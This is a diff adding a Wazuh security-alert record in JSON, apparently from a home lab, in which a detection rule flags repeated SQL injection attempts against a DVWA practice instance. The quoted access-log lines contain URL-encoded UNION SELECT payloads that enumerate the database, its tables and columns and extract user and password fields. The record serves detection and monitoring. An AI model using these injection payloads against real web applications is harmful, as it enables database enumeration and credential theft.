@@ -1,0 +1,73 @@
+{
+  "_index": "wazuh-alerts-4.x-2026.07.18",
+  "_id": "ABE_d58Bro5D_we_GGq-",
+  "_version": 1,
+  "_score": null,
+  "_source": {
+    "input": {
+      "type": "log"
+    },
+    "agent": {
+      "ip": "192.168.1.196",
+      "name": "debian",
+      "id": "001"
+    },
+    "previous_output": "192.168.1.133 - - [19/Jul/2026:01:00:41 +0300] \"GET /dvwa/vulnerabilities/sqli/?id=1%27+UNION+SELECT+column_name%2Cnull+FROM+information_schema.columns+--+-&Submit=Submit HTTP/1.1\" 200 6239 \"http://192.168.1.196/dvwa/vulnerabilities/sqli/?id=1%27+UNION+SELECT+table_name%2Cnull+FROM+information_schema.tables+--+-&Submit=Submit\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36\"\n192.168.1.133 - - [19/Jul/2026:01:00:34 +0300] \"GET /dvwa/vulnerabilities/sqli/?id=1%27+UNION+SELECT+table_name%2Cnull+FROM+information_schema.tables+--+-&Submit=Submit HTTP/1.1\" 200 2591 \"http://192.168.1.196/dvwa/vulnerabilities/sqli/?id=1%27+UNION+SELECT+user%2Cpassword+FROM+users+--+-&Submit=Submit\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36\"\n192.168.1.133 - - [19/Jul/2026:01:00:25 +0300] \"GET /dvwa/vulnerabilities/sqli/?id=1%27+UNION+SELECT+user%2Cpassword+FROM+users+--+-&Submit=Submit HTTP/1.1\" 200 2010 \"http://192.168.1.196/dvwa/vulnerabilities/sqli/?id=1%27+UNION+SELECT+null%2Cnull+--+-&Submit=Submit\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36\"\n192.168.1.133 - - [19/Jul/2026:01:00:16 +0300] \"GET /dvwa/vulnerabilities/sqli/?id=1%27+UNION+SELECT+null%2Cnull+--+-&Submit=Submit HTTP/1.1\" 200 1843 \"http://192.168.1.196/dvwa/vulnerabilities/sqli/?id=1%27+UNION+SELECT+database%28%29%2Cnull+--+-&Submit=Submit\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36\"",
+    "manager": {
+      "name": "wazuh-server"
+    },
+    "data": {
+      "protocol": "GET",
+      "srcip": "192.168.1.133",
+      "id": "200",
+      "url": "/dvwa/vulnerabilities/sqli/?id=1%27+UNION+SELECT+database%28%29%2Cnull+--+-&Submit=Submit"
+    },
+    "rule": {
+      "firedtimes": 1,
+      "mail": true,
+      "level": 12,
+      "description": "Multiple SQL injection attempts from the same source - possible enumeration",
+      "groups": [
+        "sqli",
+        "web",
+        "attack"
+      ],
+      "mitre": {
+        "technique": [
+          "Exploit Public-Facing Application",
+          "Gather Victim Network Information"
+        ],
+        "id": [
+          "T1190",
+          "T1590"
+        ],
+        "tactic": [
+          "Initial Access",
+          "Reconnaissance"
+        ]
+      },
+      "id": "100101",
+      "frequency": 5
+    },
+    "location": "/var/log/apache2/access.log",
+    "decoder": {
+      "name": "web-accesslog"
+    },
+    "id": "1784412048.124008",
+    "full_log": "192.168.1.133 - - [19/Jul/2026:01:00:48 +0300] \"GET /dvwa/vulnerabilities/sqli/?id=1%27+UNION+SELECT+database%28%29%2Cnull+--+-&Submit=Submit HTTP/1.1\" 200 1850 \"http://192.168.1.196/dvwa/vulnerabilities/sqli/?id=1%27+UNION+SELECT+column_name%2Cnull+FROM+information_schema.columns+--+-&Submit=Submit\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36\"",
+    "timestamp": "2026-07-18T22:00:48.281+0000"
+  },
+  "fields": {
+    "timestamp": [
+      "2026-07-18T22:00:48.281Z"
+    ]
+  },
+  "highlight": {
+    "rule.id": [
+      "@opensearch-dashboards-highlighted-field@100101@/opensearch-dashboards-highlighted-field@"
+    ]
+  },
+  "sort": [
+    1784412048281
+  ]
+}
